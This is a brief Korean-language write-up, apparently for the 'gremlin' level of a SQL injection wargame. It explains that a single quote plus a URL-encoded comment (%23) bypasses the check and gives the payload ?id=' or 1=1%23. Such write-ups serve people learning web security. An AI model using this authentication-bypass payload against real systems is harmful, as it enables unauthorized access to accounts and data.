# gremlin

기본적인 sql injection 문제이다.   
<br/>

* 싱글 쿼터(')와 주석을 이용하면 해결할 수 있다.
* \# : %23   
<br/>

![](1.PNG)

```
?id=' or 1=1%23
```
